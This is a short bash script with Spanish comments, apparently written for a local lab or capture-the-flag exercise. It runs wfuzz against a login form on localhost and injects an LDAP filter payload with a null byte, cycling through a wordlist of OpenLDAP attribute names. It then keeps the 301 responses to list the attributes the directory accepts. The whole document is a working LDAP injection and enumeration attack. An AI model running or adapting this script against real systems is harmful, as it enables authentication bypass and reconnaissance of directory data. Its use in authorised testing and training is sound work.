#!/bin/bash

# Ejecuta wfuzz y captura la salida
wfuzz -c -w LDAP-openldap-attributes.txt -d 'user_id=*)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888 2>/dev/null > out.txt

# Filtrar y mostrar todo lo que está entre comillas dobles
cat out.txt | grep 301 | grep -o '"[^"]*"' | tr -d '"'
rm out.txt
